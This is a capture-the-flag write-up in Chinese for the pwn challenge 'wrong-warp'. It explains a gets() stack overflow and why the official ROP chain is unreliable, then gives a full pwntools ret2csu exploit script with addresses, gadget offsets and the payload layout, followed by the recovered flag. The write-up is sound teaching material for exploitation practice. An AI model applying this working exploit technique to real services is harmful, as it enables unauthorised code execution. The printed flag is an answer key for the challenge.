# wrong-warp

## 题目简述

游戏在村庄保存流程中用 `gets` 写入 32 字节局部数组，保存返回地址偏移为 40。二进制非 PIE、无 stack canary、NX 开启。若调用 `fight("finalBoss", damage, health)` 且 `health <= 0`，函数会直接进入胜利分支并读取 flag；全局 `saveName` 可提前写入 `finalBoss\0` 和一个函数指针。

## 解题过程

官方脚本只用 `pop rdi; ret` 设置第一个参数，然后直接返回 `fight`，隐含依赖 `gets` 返回后 `rdx` 恰好非正。GDB 在当前发布环境中测得 `rdx` 实际为正指针，因此这条最短链并不稳健。

更可靠的方法是 ret2csu。`__libc_csu_init` 提供两段 gadget：一段依次弹出 `rbx, rbp, r12, r13, r14, r15`，另一段执行：

```text
rdx = r14
rsi = r13
edi = r12d
call [r15 + rbx*8]
```

先把保存名写成 `finalBoss\0`，并在 `saveName+16` 放入 `fight` 地址。ROP 令 `rbx=0`、`rbp=1`、`r12=saveName`、`r13=0`、`r14=0`、`r15=saveName+16`，即可稳定调用 `fight(saveName, 0, 0)`。

```python
from pwn import context, flat, p64, remote

context.arch = "amd64"
io = remote("challenge-host", 12345)

SAVE_NAME = 0x4040A0
FIGHT = 0x4014DB
CSU_POP = 0x4017A2
CSU_CALL = 0x401788

name = b"finalBoss\x00".ljust(16, b"A") + p64(FIGHT)
io.sendline(name)
io.sendline(b"w")  # westVillage
io.sendline(b"r")  # rest -> save()

payload = flat(
    b"f" * 40,
    CSU_POP,
    0,             # rbx
    1,             # rbp，保证 CSU 循环只执行一次
    SAVE_NAME,     # r12 -> edi
    0,             # r13 -> rsi
    0,             # r14 -> rdx
    SAVE_NAME + 16,# r15 -> [fight pointer]
    CSU_CALL,
    0,             # CSU epilogue 的 add rsp, 8
    0, 0, 0, 0, 0, 0, 0,
)
io.sendline(payload)
print(io.recvall().decode(errors="replace"))
```

该链已在仓库二进制上本地执行验证，输出：

```text
tjctf{up_up_d0wn_d0wn_l3ft_r1ght_l3ft_r1ght_b_a}
```

## 方法总结

- 核心技巧：栈溢出后用 ret2csu 完整控制前三个 SysV AMD64 参数，并通过全局可写区提供函数指针与目标字符串。
- 识别信号：缺少 `pop rdx` gadget、目标函数需要三个参数、二进制非 PIE 且全局缓冲区可预先布置数据。
- 复用要点：不要把调用者未定义的寄存器残值当成稳定前提；ret2csu 调用后还要为 `add rsp,8` 和六个 `pop` 准备清理栈槽。
